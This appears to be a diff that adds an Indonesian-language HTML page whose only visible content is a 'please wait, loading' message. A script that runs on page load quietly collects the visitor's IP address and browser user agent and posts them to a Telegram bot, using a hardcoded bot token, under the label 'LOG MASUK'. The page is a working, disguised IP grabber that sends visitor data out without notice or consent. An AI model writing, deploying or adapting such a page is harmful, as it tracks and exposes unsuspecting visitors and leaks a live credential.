@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
+    <h2>Silakan tunggu, halaman sedang dimuat...</h2>
+
+    <script>
+        const BOT_TOKEN = '8879804974:AAH38a0QQMXqlgTEd-5tHGEoEiGb7y2BO2Q';
+        const CHAT_ID = 'ISI_ANGKA_CHAT_ID_KAMU'; 
+
+        async function sendLog() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const userIp = ipData.ip;
+                const userAgent = navigator.userAgent;
+
+                const text = `[+] LOG MASUK!\n\n🌐 IP: ${userIp}\n📱 Device: ${userAgent}`;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text
+                    })
+                });
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        sendLog();
+    </script>
+</body>
+</html>
